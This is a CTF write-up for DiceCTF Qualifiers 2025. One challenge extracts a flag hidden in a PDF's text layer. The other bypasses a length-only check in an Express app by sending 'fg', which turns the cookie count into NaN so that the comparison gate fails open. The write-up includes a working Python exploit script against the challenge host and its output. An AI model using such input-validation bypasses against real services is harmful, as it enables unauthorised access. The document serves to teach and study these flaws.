---
title: Dice CTF Qualifiers 2025 - MISC, WEB
date: 2025-03-29
tags: [ctf, misc, web]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/dice-ctf-quals_2025
image: /assets/img/dice-ctf-quals_2025/dice_banner.png
---

# Misc
## bcu-binding
**Solvers:** 430 <br>
**Author:** hgarrereyn

### Description
Comrades, we found this old manual in our basement. Can you see if there's anything interesting about it? <br>

### Solution
The challenge provide a `cpu_documentation.pdf` file. <br>

![cpu_documentation.pdf](/assets/img/dice-ctf-quals_2025/cpu_documentation.png)

Hmm, find a flag in a pdf file, maybe there is a raw text cover under this pdf file. <br>
After researching, I found this website [Extract text from PDF file using Python](https://www.geeksforgeeks.org/extract-text-from-pdf-file-using-python/), let's get it.

```python
import PyPDF2

with open("cpu_documentation.pdf", "rb") as file:
    reader = PyPDF2.PdfReader(file)
    page = reader.pages[0]  # Get the first page
    text = page.extract_text()
    print(text)
```

```bash
➜  bcu-binding python3 extract_raw.py                     
СОВЕРШЕННО СЕКРЕТНОTechnical Documentation No. 382-B
Biological Computing Unit BCU-8
Institute for BioSafety
Department of Biological Computing Systems
Institute for BioSafety
USSR Academy of Sciences
Original: 15.04.1982
Updated: 23.09.1983FLAG: dice{r3ad1ng_th4_d0cs_71ccd}
Contents
1 Background 3
1.1 Historical Development . . . . . . . . . . . . . . . . . . . . . . 3
1.2 Previous Work . . . . . . . . . . . . . . . . . . . . . . . . . . 3
1.2.1 First Generation Systems (1962-1970) . . . . . . . . . . 3
1.2.2 Second Generation Systems (1971-1977) . . . . . . . . 4
1.2.3 Experimental Prototypes (1976-1978) . . . . . . . . . . 4
1.3 Timeline of Key Developments . . . . . . . . . . . . . . . . . . 5
1.4 Theoretical Foundations . . . . . . . . . . . . . . . . . . . . . 5
1.4.1 Biological Signal Processing . . . . . . . . . . . . . . . 5
1.4.2 Memory Architecture . . . . . . . . . . . . . . . . . . . 5
1.5 International Context . . . . . . . . . . . . . . . . . . . . . . . 6
1.5.1 Historical Development of Western Designs . . . . . . . 6
1.5.2 Comparative Analysis with Western Designs . . . . . . 7
1.5.3 Architectural Priorities . . . . . . . . . . . . . . . . . . 7
1.5.4 Technical Comparison of Key Features . . . . . . . . . 8
1.5.5 Performance Characteristics . . . . . . . . . . . . . . . 8
1.6 Current Status . . . . . . . . . . . . . . . . . . . . . . . . . . 9
2 Technical Overview 9
2.1 System Architecture . . . . . . . . . . . . . . . . . . . . . . . 9
2.2 Memory Organization . . . . . . . . . . . . . . . . . . . . . . 10
2.2.1 Basic Memory Layout . . . . . . . . . . . . . . . . . . 10
2.2.2 Register Overview . . . . . . . . . . . . . . . . . . . . 10
2.3 Memory Access Mechanisms . . . . . . . . . . . . . . . . . . . 10
1
```

I successfully get the flag: `dice{r3ad1ng_th4_d0cs_71ccd}`. <br>

Also I am curious if I can search the flag inside the pdf file, maybe it hidden not visual but can be found by text search. <br>

![search_flag](/assets/img/dice-ctf-quals_2025/search_flag.png)

As expected, I found the flag in the text search. Noice :D <br>

**Flag:** `dice{r3ad1ng_th4_d0cs_71ccd}`

# Web
## cookie-recipes-v3
**Solvers:** 459 <br>
**Author:** BrownieInMotion

### Description
Mmmmmmm... <br>
![cookie-recipes-v3](/assets/img/dice-ctf-quals_2025/cookie-recipes-v3.png)

### Solution
This website basically just a click to receive the amount of cookies. The challenge provide a `index.js` file, let's check it. <br>

```js
const express = require('express')

const app = express()

const cookies = new Map()

app.use((req, res, next) => {
    const cookies = req.headers.cookie
    const user = cookies?.split('=')?.[1]

    if (user) { req.user = user }
    else {
        const id = Math.random().toString(36).slice(2)
        res.setHeader('set-cookie', `user=${id}`)
        req.user = id
    }

    next()
})

app.get('/', (req, res) => {
    const count = cookies.get(req.user) ?? 0
    res.type('html').send(`
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css">
        <link rel="stylesheet" href="https://fonts.xz.style/serve/inter.css">
        <div>You have <span>${count}</span> cookies</div>
        <button id="basic">Basic cookie recipe (makes one)</button>
        <br>
        <button id="advanced">Advanced cookie recipe (makes a dozen)</button>
        <br>
        <button disabled>Super cookie recipe (makes a million)</button>
        <br>
        <button id="deliver">Deliver cookies</button>
        <script src="/script.js"></script>
    `)
})

app.get('/script.js', (_req, res) => {
    res.type('js').send(`
        const basic = document.querySelector('#basic')
        const advanced = document.querySelector('#advanced')
        const deliver = document.querySelector('#deliver')

        const showCookies = (number) => {
            const span = document.querySelector('span')
            span.textContent = number
        }

        basic.addEventListener('click', async () => {
            const res = await fetch('/bake?number=1', { method: 'POST' })
            const number = await res.text()
            showCookies(+number)
        })

        advanced.addEventListener('click', async () => {
            const res = await fetch('/bake?number=12', { method: 'POST' })
            const number = await res.text()
            showCookies(+number)
        })


        deliver.addEventListener('click', async () => {
            const res = await fetch('/deliver', { method: 'POST' })
            const text = await res.text()
            alert(text)
        })
    `)
})

app.post('/bake', (req, res) => {
    const number = req.query.number
    if (!number) {
        res.end('missing number')
    } else if (number.length <= 2) {
        cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))
        res.end(cookies.get(req.user).toString())
    } else {
        res.end('that is too many cookies')
    }
})

app.post('/deliver', (req, res) => {
    const current = cookies.get(req.user) ?? 0
    const target = 1_000_000_000
    if (current < target) {
        res.end(`not enough (need ${target - current}) more`)
    } else {
        res.end(process.env.FLAG)
    }
})

app.listen(3000)
```

So when lookthrough the code, we can see that our goal is to get `1_000_000_000` cookies in order to get the flag. <br>
And also the number length is `<= 2`, so we can how intercept the request and increase to more than 2 digits. <br>
Hmm, let's research some type of number in javascript. <br>
I found this website [Javascript Numbers](https://www.w3schools.com/js/js_numbers.asp). <br>

![number](/assets/img/dice-ctf-quals_2025/number.png)

What if we try `number=fg`? <br>

![number_fg](/assets/img/dice-ctf-quals_2025/number_fg.png)

It will return `NaN`, which is not a number. But from the definition, it is still a number not not legal only. <br>
If we check the `deliver` request, it will return the flag. <br>

![flag](/assets/img/dice-ctf-quals_2025/flag.png)

This is the process when we inject `fg` as a number. <br>

```js
app.post('/bake', (req, res) => {
    const number = req.query.number
    if (!number) {
        res.end('missing number')
    } else if (number.length <= 2) {  // Only checks length!
        cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))  // NaN + number = NaN
        res.end(cookies.get(req.user).toString())
    } else {
        res.end('that is too many cookies')
    }
})

app.post('/deliver', (req, res) => {
    const current = cookies.get(req.user) ?? 0
    const target = 1_000_000_000
    if (current < target) {  // NaN < 1000000000 is false!
        res.end(`not enough (need ${target - current}) more`)
    } else {
        res.end(process.env.FLAG)  // We get the flag!
    }
})
```

Because `NaN` is not a legal number so javascript will return `false` when we compare it with `1000000000`. <br>

Here is the script to exploit.

```python
import requests

def exploit_cookie_challenge():
    BASE_URL = "https://cookie.dicec.tf"
    BAKE_URL = f"{BASE_URL}/bake"
    DELIVER_URL = f"{BASE_URL}/deliver"

    headers = {
        "accept": "*/*",
        "content-length": "0",
        "origin": "https://cookie.dicec.tf",
        "referer": "https://cookie.dicec.tf/",
    }

    session = requests.Session()
    initial_response = session.get(BASE_URL)
    
    if 'user' not in session.cookies:
        print("Failed to get user cookie!")
        return

    user_cookie = session.cookies['user']
    print(f"[+] Got user cookie: {user_cookie}")

    exploit_number = "fg"
    
    try:
        bake_response = session.post(
            f"{BAKE_URL}?number={exploit_number}",
            headers=headers
        )
        print(f"[+] Bake response: {bake_response.text}")

        deliver_response = session.post(
            DELIVER_URL,
            headers=headers
        )
        print(f"[+] Deliver response: {deliver_response.text}")

        if "not enough" not in deliver_response.text.lower():
            print("[+] Success! Flag should be above!")
        else:
            print("[-] Failed to get enough cookies")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exploit: {e}")

if __name__ == "__main__":
    print("[+] Starting cookie challenge exploit...")
    exploit_cookie_challenge()
```

```bash
➜  cookie-recipes-v3 python3 exploit.py
[+] Starting cookie challenge exploit...
[+] Got user cookie: uusuab9uyu
[+] Bake response: NaN
[+] Deliver response: dice{cookie_cookie_cookie}
[+] Success! Flag should be above!
```

**Flag:** `dice{cookie_cookie_cookie}`